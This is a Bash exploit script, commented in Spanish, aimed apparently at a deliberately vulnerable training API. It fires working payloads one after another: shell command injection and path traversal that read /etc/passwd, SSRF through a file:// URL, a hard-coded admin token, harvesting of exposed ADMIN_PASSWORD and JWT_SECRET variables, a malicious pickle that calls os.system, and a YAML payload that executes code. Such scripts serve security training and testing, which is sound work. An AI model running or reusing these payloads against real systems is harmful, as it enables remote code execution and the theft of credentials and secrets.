#!/bin/bash

# Script para explotar vulnerabilidades en vulnerable-api

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

if [ -z "$1" ]; then
    echo -e "${RED}Uso: $0 <URL_BASE>${NC}"
    echo "Ejemplo: $0 http://localhost:5000"
    exit 1
fi

BASE_URL="$1"

echo -e "${BLUE}=== Explotando Vulnerabilidades en API ===${NC}\n"

# 1. Command Injection
echo -e "${YELLOW}[1] Probando Command Injection en /ping${NC}"
RESPONSE=$(curl -s "${BASE_URL}/ping?host=localhost; cat /etc/passwd")
echo "$RESPONSE" | grep -i "root:" && \
    echo -e "${GREEN}✓ Command Injection vulnerable${NC}" || \
    echo -e "${RED}✗ Command Injection no explotable${NC}"

# 2. Path Traversal
echo -e "\n${YELLOW}[2] Probando Path Traversal en /read${NC}"
curl -s "${BASE_URL}/read?file=/etc/passwd" | grep -i "root:" && \
    echo -e "${GREEN}✓ Path Traversal vulnerable${NC}" || \
    echo -e "${RED}✗ Path Traversal no explotable${NC}"

# 3. SSRF (Server-Side Request Forgery)
echo -e "\n${YELLOW}[3] Probando SSRF en /fetch${NC}"
echo -e "${YELLOW}   Intentando leer archivo local...${NC}"
curl -s "${BASE_URL}/fetch?url=file:///etc/passwd" | grep -i "root:" && \
    echo -e "${GREEN}✓ SSRF vulnerable${NC}" || \
    echo -e "${RED}✗ SSRF no explotable${NC}"

# 4. Autenticación Débil
echo -e "\n${YELLOW}[4] Probando autenticación débil en /admin${NC}"
RESPONSE=$(curl -s -H "X-Token: admin_token_never_change" "${BASE_URL}/admin")
echo "$RESPONSE" | grep -i "admin\|secret" && \
    echo -e "${GREEN}✓ Autenticación débil vulnerable${NC}" || \
    echo -e "${RED}✗ Autenticación no vulnerable${NC}"

# 5. Exposición de Variables de Entorno
echo -e "\n${YELLOW}[5] Probando exposición de variables en /env${NC}"
curl -s "${BASE_URL}/env" | jq '.' 2>/dev/null | grep -i "ADMIN_PASSWORD\|JWT_SECRET" && \
    echo -e "${GREEN}✓ Variables de entorno expuestas${NC}" || \
    echo -e "${RED}✗ No se encontraron variables${NC}"

# 6. Pickle Deserialization (peligroso - solo para demostración)
echo -e "\n${YELLOW}[6] Probando deserialización insegura en /unpickle${NC}"
echo -e "${RED}   ADVERTENCIA: Esto puede ser peligroso${NC}"
# Crear un payload pickle malicioso simple
python3 << 'PYTHON_SCRIPT' > /tmp/pickle_payload 2>/dev/null || echo -e "${YELLOW}   Python3 no disponible, saltando pickle${NC}"
import pickle
import os

class Malicious:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Malicious())
print(payload.hex())
PYTHON_SCRIPT

if [ -f /tmp/pickle_payload ]; then
    PAYLOAD_HEX=$(cat /tmp/pickle_payload | tr -d '\n')
    PAYLOAD=$(echo "$PAYLOAD_HEX" | xxd -r -p 2>/dev/null || echo "")
    if [ -n "$PAYLOAD" ]; then
        curl -s -X POST "${BASE_URL}/unpickle" \
            -H "Content-Type: application/octet-stream" \
            --data-binary "$PAYLOAD" && \
            echo -e "${GREEN}✓ Deserialización vulnerable${NC}" || \
            echo -e "${RED}✗ Deserialización no explotable${NC}"
    fi
    rm -f /tmp/pickle_payload
fi

# 7. YAML Deserialization
echo -e "\n${YELLOW}[7] Probando YAML deserialization en /yaml${NC}"
curl -s -X POST "${BASE_URL}/yaml" \
    -H "Content-Type: text/yaml" \
    -d "!!python/object/apply:os.system ['id']" && \
    echo -e "${GREEN}✓ YAML deserialization vulnerable${NC}" || \
    echo -e "${RED}✗ YAML deserialization no explotable${NC}"

echo -e "\n${BLUE}=== Explotación Completada ===${NC}"

